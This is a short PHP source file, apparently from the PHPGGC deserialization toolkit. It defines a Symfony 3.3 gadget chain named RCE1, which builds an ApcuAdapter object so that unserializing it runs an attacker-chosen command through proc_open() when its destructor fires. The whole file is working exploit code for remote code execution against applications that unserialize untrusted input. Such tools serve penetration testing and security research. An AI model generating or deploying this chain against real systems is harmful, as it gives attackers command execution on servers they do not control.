<?php

namespace GadgetChain\Symfony;

class RCE1 extends \PHPGGC\GadgetChain\RCE
{
    public $version = '3.3';
    public $vector = '__destruct';
    public $author = 'cf';
    public $informations = 'Executes given command through proc_open()';
    public $parameters = [
    	'command'
    ];

    public function generate(array $parameters)
    {
        $command = $parameters['command'];

        return new \Symfony\Component\Cache\Adapter\ApcuAdapter(
        	$command
        );
    }
}
